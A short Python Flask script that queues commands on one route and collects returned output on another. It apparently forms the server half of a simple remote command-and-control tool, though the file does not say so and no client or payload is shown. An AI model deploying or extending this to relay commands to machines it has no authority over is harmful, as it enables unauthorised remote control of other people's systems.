from flask import Flask, request, jsonify


IP = "127.0.0.1"
PORT = 5000


command_list = [" "]

response = []
app = Flask(__name__)


@app.route("/", methods=["POST", "GET"])
def responses():
    global response
    if request.method == "POST":
        capture_data = (request.json)
        if len(response) >= 5:
            response.pop(0)

        response.append(capture_data["response"].strip())
        return {}
    
    
    return jsonify(response)

@app.route("/command", methods=["GET", "POST"])
def command():
    global command_list
    if request.method == "POST":
        capture_data = request.json
        command_list.append(capture_data["command"])
        return {"command": capture_data["command"]}
    
    if len(command_list) <= 1:
        last_command = command_list[len(command_list)-1]

    else:
        last_command = command_list.pop()    

    return {"command": last_command}


app.run(host=IP, port=PORT)